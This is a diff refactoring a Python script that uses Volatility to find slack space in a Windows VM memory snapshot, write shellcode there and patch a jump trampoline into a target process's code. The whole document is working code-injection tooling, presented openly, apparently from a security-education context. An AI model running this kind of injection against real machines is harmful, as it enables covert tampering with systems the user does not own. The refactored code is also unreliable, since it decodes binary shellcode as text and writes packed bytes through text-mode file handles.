@@ -14,11 +14,8 @@ memory_file = "/Users/justin/Documents/Virtual Machines.localized/" \
 slack_space = None
 trampoline_offset = None
 
-# read in our shellcode
-sc_fd = open("cmeasure.bin", "rb")
-sc = sc_fd.read()
-sc_fd.close()
-
+with open("cmeasure.bin", "rb") as sc_fd:
+    sc = sc_fd.read()
 sys.path.append("/Downloads/volatility-2.3.1")
 
 registry.PluginImporter()
@@ -29,7 +26,7 @@ registry.register_global_options(config, addrspace.BaseAddressSpace)
 
 config.parse_options()
 config.PROFILE = "Win2003SP2x86"
-config.LOCATION = "file://%s" % memory_file
+config.LOCATION = f"file://{memory_file}"
 
 p = taskmods.PSList(config)
 
@@ -45,34 +42,32 @@ for process in p.calculate():
             physical = address_space.vtop(page[0])
             if physical is not None:
                 if slack_space is None:
-                    fd = open(memory_file, "r+")
-                    fd.seek(physical)
-                    buf = fd.read(page[1])
-                    try:
-                        offset = buf.index("\x00" * len(sc))
-                        slack_space = page[0] + offset
+                    with open(memory_file, "r+") as fd:
+                        fd.seek(physical)
+                        buf = fd.read(page[1])
+                        try:
+                            offset = buf.index("\x00" * len(sc))
+                            slack_space = page[0] + offset
 
-                        print("[*] Found good shellcode location!")
-                        print("[*] Virtual address: 0x%08x" % slack_space)
-                        print("[*] Physical address: 0x%08x" % (
-                                physical + offset))
-                        print("[*] Injecting shellcode.")
+                            print("[*] Found good shellcode location!")
+                            print("[*] Virtual address: 0x%08x" % slack_space)
+                            print("[*] Physical address: 0x%08x" % (
+                                    physical + offset))
+                            print("[*] Injecting shellcode.")
 
-                        fd.seek(physical + offset)
-                        fd.write(sc.decode())
-                        fd.flush()
+                            fd.seek(physical + offset)
+                            fd.write(sc.decode())
+                            fd.flush()
 
-                        # create our trampoline
-                        tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
-                        tramp += "\xff\xe3"
+                            # create our trampoline
+                            tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
+                            tramp += "\xff\xe3"
 
-                        if trampoline_offset is not None:
-                            break
+                            if trampoline_offset is not None:
+                                break
 
-                    except:
-                        pass
-
-                    fd.close()
+                        except:
+                            pass
 
                 # check for our target code location
                 if page[0] <= equals_button < ((page[0] + page[1]) - 7):
@@ -90,9 +85,7 @@ for process in p.calculate():
 
         print("[*] Writing trampoline...")
 
-        fd = open(memory_file, "r+")
-        fd.seek(trampoline_offset)
-        fd.write(tramp)
-        fd.close()
-
+        with open(memory_file, "r+") as fd:
+            fd.seek(trampoline_offset)
+            fd.write(tramp)
         print("[*] Done injecting code.")
